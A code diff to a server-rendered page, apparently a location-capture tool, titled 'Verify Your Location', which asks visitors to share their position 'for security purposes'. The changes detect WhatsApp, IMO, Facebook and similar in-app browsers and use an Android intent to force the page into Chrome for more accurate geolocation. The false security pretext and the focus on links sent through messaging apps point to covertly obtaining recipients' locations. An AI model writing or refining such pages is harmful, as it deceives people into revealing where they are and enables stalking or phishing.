@@ -43,25 +43,80 @@ const renderCapturePage = async (req, res, next) => {
                   font-weight: 600;
                   cursor: pointer;
                   transition: background-color 0.2s;
+                  text-decoration: none;
+                  display: inline-block;
               }
               .btn:hover { background-color: #0073e6; }
               .btn:disabled { background-color: #ccc; cursor: not-allowed; }
               #status { margin-top: 1rem; font-size: 0.9rem; }
               .success { color: #28a745; }
               .error { color: #dc3545; }
+              .warning-box {
+                  background: #fff3cd;
+                  border: 1px solid #ffeeba;
+                  color: #856404;
+                  padding: 15px;
+                  border-radius: 8px;
+                  margin-bottom: 20px;
+                  display: none;
+                  font-size: 0.9rem;
+              }
           </style>
       </head>
       <body>
+          <div id="in-app-warning" class="warning-box">
+              <strong>Notice:</strong> You are using an in-app browser (WhatsApp/IMO). For better accuracy, please open this link in <strong>Chrome</strong>.
+          </div>
+
           <div class="card">
               <h1>Verify Your Location</h1>
-              <p>Please click the button below to verify your current location for security purposes.</p>
-              <button id="capture-btn" class="btn">Share Location</button>
+              <p id="instruction">Please click the button below to verify your current location for security purposes.</p>
+              
+              <div id="action-area">
+                  <button id="capture-btn" class="btn">Share Location</button>
+              </div>
+
               <div id="status"></div>
           </div>
 
           <script>
               const btn = document.getElementById('capture-btn');
               const status = document.getElementById('status');
+              const warning = document.getElementById('in-app-warning');
+              const actionArea = document.getElementById('action-area');
+
+              // Detect if running in in-app browser (WhatsApp, IMO, Facebook, etc.)
+              function isInAppBrowser() {
+                  const ua = navigator.userAgent || navigator.vendor || window.opera;
+                  return (ua.indexOf('FBAN') > -1) || (ua.indexOf('FBAV') > -1) || 
+                         (ua.indexOf('WhatsApp') > -1) || (ua.indexOf('Imo') > -1) ||
+                         (ua.indexOf('Messenger') > -1) || (ua.indexOf('Line') > -1);
+              }
+
+              // Try to force open Chrome on Android using intent scheme
+              function tryOpenChrome() {
+                  const currentUrl = window.location.href;
+                  if (/android/i.test(navigator.userAgent)) {
+                      // Android Intent for Chrome
+                      const intentUrl = 'intent://' + currentUrl.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
+                      
+                      actionArea.innerHTML = \`
+                          <a href="\${intentUrl}" class="btn" style="background-color: #28a745;">Open in Chrome Browser</a>
+                          <p style="font-size: 0.8rem; margin-top: 10px; color: #666;">If Chrome doesn't open automatically, click the button above.</p>
+                      \`;
+                      warning.style.display = 'block';
+                      return true;
+                  }
+                  return false;
+              }
+
+              // Check on load
+              if (isInAppBrowser()) {
+                  const forced = tryOpenChrome();
+                  if (!forced) {
+                      warning.style.display = 'block';
+                  }
+              }
 
               btn.addEventListener('click', () => {
                   if (!navigator.geolocation) {
